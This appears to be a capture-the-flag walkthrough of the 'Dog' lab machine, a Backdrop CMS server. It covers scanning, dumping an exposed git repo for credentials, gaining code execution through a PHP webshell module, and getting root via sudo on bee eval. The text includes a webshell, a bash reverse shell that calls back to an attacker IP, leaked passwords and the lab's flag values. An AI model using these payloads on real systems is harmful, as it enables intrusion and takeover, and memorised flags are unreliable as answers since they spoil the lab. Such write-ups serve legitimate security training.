# Dog Walkthrough

## Recon

### Initial scanning

We start to find open port 

nmap -p- --min-rate 10000 10.129.231.223

2 ports open

PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  

Then we do 

nmap -sCV -p 22,80 10.129.231.223

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)  
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)  
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)  
| http-robots.txt: 22 disallowed entries (15 shown)  
| /core/ /profiles/ /README.md /web.config /admin   
| /comment/reply /filter/tips /node/add /search /user/register   
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
| http-git:   
|   10.129.231.223:80/  
|     Git repository found!  
|     Repository description: Unnamed repository; edit this file 'description' to name the...  
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...  
|_http-title: Home | Dog  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne  

Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 focal.

There is a robots.txt as well as an exposed  repo!

There is login that i can try

The error message on the password reset tab seems to verify if a username is in use or not:  
Sorry, admin is not recognized as a user name or an email address.   

The page footer said that it powered by Backdrop CMS

I also check http response with curl -I http://10.129.231.223 

Backdrop is a PHP CMS, and loading the main page as /index.php works.

Now I use directory brute force.

Given that have git repo, I don’t need to enumerate directories with brute force. Still, it’s interesting to see what’s exposed. I run feroxbuster against the site, and include -x php since I know the site is PHP

feroxbuster -u http://10.129.231.223 --dont-extract-links -x php  

### Backdrop Version

All the directories without an index.php file have listing enabled, and clicking around, I’ll find that the version is available in a testing.info file available on the webserver:  
curl http://10.129.231.223/core/profiles/testing/testing.info  

It’s version 1.27.1 

### Source Code

So nmap scanning notices that there was an exposed repo on the webserver. I used git-dumper

git-dumper http://10.129.231.223/ repo 

Then I check the file 

cat ~/htb/Dog/repo/settings.php 

There’s a settings.php file in the root of the repo. It has database connection information

$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';  
$database_prefix = '';  

There is a password there, but it doesn’t work for the root user, so I need usernames

Then i cd to repo and do git log

commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)  
Author: root <dog@dog.htb>  
Date:   Fri Feb 7 21:22:11 2025 +0000  

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases  

Username	Password  
root	BackDropJ2024DS2024  

Then  
grep -ir dog.htb 

files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"  
=> Username
tiffany
 
Username	Password  
tiffany	BackDropJ2024DS2024  

### Shell as www-data

I run status report under report, it reveals version 1.27.1

Backdrop CMS 1.27.1 and search CVE we can Authenticated Remote Command Execution (RCE) CVE-2024-41709

### Admin RCE

With access here, I can follow the same path I took in CarpeDiem. I’ll want to upload a malicious module via the Functionality –> Install new modules menu:

This repo (https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop) described exploiting a different vulnerability in a different version of Backdrop, but it has a webshell in an extension in the releases tab so 

I’ll download reference.tar. If I extract the files from the archive, there’s a reference directory:  
tar xf reference.tar 

Then cd reference && ls

shell.php has a simple webshell:

<?php system($_GET['cmd']);?>

### Install webshell
https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c 

### Shell

There’s a cleanup script running fairly quickly, so I’ll need to act fast to use this.

http://10.129.231.223/modules/reference/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/[Attack IP]/443%200%3E%261%27

www-data@dog:/var/www/html/modules/reference$

then i do cat /etc/passwd

Found   
Username  
jobert
johncusack

cat /etc/passwd | grep 'sh$'  
root:x:0:0:root:/root:/bin/bash  
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash  
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash  

The password from the website config and from logging into the CMS as tiffany works for johncusack as well with su

Then I ssh johncusack@10.129.231.223 with password BackDropJ2024DS2024

johncusack@dog:~$ cat user.txt 
d3bd29e65dd35cc7e9b36dad604bfcaa


johncusack can run bee as root with sudo: sudo -l

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee


bee is the comm-and line utility for Backdrop CMS. Running bee prints a help menu with a ton of subcommands:

eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.


### Root Directory

johncusack@dog:~$ sudo bee db-query 'show databases'  

 ✘  The required bootstrap level for 'db-query' is not ready.   

johncusack@dog:~$ bee status  

⚠️ No Backdrop installation found. Run this command again from within a Backdrop installation, or use  
    the '--root' global option.    

/var/www/html has the web application after I check what is in the directory

Then I go to johncusack@dog:/var/www/html$ sudo bee db-query 'show databases'

Then I check sudo bee status --root=/var/www/html and It also works

I can run PHP code sudo bee eval 'system("id")' to check 

and uid=0(root) gid=0(root) groups=0(root) that indicates I have highest previledges to access restricted place

Then sudo bee eval 'system("bash")'

Wow la i am in 

root@dog:/var/www/html# whoami
root

root@dog:/# cd root  
root@dog:~# ls  
root.txt  
root@dog:~# cat root.txt   
b9c7fcf34915d8d4fdac1182fd8dee48  

